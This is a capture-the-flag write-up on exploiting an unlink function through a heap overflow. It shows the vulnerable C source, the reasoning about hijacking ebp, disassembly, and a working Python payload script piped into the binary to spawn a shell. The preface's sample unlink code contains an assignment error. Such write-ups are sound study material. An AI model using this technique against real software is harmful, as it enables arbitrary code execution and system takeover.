# Unlink write-up

## Preface

This challenge is about exploiting the infamous unlink function. The unlink function is a function that appears in implementations of libc's *free* function. This functions is used to remove an allocated block from the allocated blocks linked list when it gets freed. The function just connects the next element in the list to the previous element, which looks something like this:

```c
void unlink(OBJ* obj) {
    OBJ* FD = NULL;
    OBJ* BK = NULL;
    FD = obj->fd;
    BK = obj->bk;
	FD->BK = BK;
    BK->FD = BK;
}
```

So, if you could somehow write into an heap allocated block's meta-data, you could write into arbitrary addresses. Because this meta-data is usually stored right before the data, if you a program contains a heap overflow bug, the meta-data can be overwritten and the unlink function can be exploited to get code execution.

## The challenge

The challenge itself is just a simplification of this, and just contains the unlink function and a shell function, which we probably should redirect code execution into.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;

void shell(){
        system("/bin/sh");
}

void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}
```

## Exploitation ideas

As I've previously solved a challenge similar to this in the phoenix wargame, I had an idea of how to exploit this bug. My idea was to change the *bk* and *fd* fields to the addresses of the return pointer of the main function, and an address on the heap which I control. The address on the heap would contain shellcode which will jump to the shell function and that's it. 

Well... after hours of trying to make this idea work, I realized that the heap is not executable in this challenge(!!!), which was quite annoying.

After debugging the program a bit and looking at the code, I found another idea. My second idea was to write the address of some user controlled area into the address to which ebp is pushed onto the stack in the unlink function. The logic behind this idea is that when the program would return from unlink, our address would be popped from the stack into *ebp* and when main would try to return into libc's wrapper, it would set *esp* to *ebp*, and actually return into *shell* as we would control the return pointer.

## Preparing the payload

In order to craft the payload that will exploit the bug, we need to understand how the value we want to change, the pushed *ebp* in *unlink*, is being used in the program, as it turns out it is not that straight forward. So, I checked the disassembly of the program and discovered that the way *main* returns is a little strange.

```assembly
main:
	...
	call unlink
	...
	mov ecx, DWORD PTR [ebp - 4]
	leave
	lea esp, [ecx - 4]
	ret
```

As you can see the returning process is indeed a bit strange. So, what we need is that *(ebp + 4)* will point to a pointer to *(shell + 4)*.

I wrote a small python script that creates the payload sends it to the program:

```python
import sys

def main():
    stack_address = input()
    heap_address = input()

    b_fd_pointer = (int(heap_address, base=16)+44).to_bytes(length=4, byteorder='little')
    ebp_address = (int(stack_address, base=16)-28).to_bytes(length=4, byteorder='little')
    shell_pointer_address = (int(heap_address, base=16)+48).to_bytes(length=4, byteorder='little')
    shell_address = b'\xeb\x84\x04\x08'
   
    payload = b'A' * 16 + b_fd_pointer + ebp_address + b'A' * 8 + shell_pointer_address + shell_address + b'\n'
    sys.stdout.buffer.write(payload)

if __name__ == '__main__':
    main()
```

To use the script we just need to pipe it into the program, and then copy the address leaks and give them as input.

```bash
(python3 solve.py; cat) | unlink
```

